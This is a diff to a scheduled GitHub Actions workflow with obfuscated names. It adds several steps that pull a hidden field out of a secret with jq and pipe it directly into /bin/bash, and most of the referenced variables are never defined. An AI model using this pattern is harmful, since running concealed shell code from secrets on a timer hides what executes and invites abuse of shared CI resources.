@@ -3,17 +3,23 @@ name: quanjingxin3910
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 2/6 * * *'
+    - cron: '18 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: quanjingxin3910
         env:
-          a079: ${{ secrets.a079 }}
+          zy496: ${{ secrets.zy496 }}
         run: |
-          echo $a079 | jq -r .ew9 | /bin/bash
-          echo $abco6762 | jq -r .ibceg287 | /bin/bash
+          echo $zy496 | jq -r .g7524 | /bin/bash
+          echo $a1804 | jq -r .l5393 | /bin/bash
+          echo $s2873 | jq -r .rliox609 | /bin/bash
+          echo $udd866 | jq -r .ly450 | /bin/bash
+          echo $xx0 | jq -r .xgzxq6 | /bin/bash
+          echo $n4 | jq -r .zu00664 | /bin/bash
+          echo $aydhb58736 | jq -r .xwg88 | /bin/bash
+          echo $n5 | jq -r .gfyr5776 | /bin/bash
 
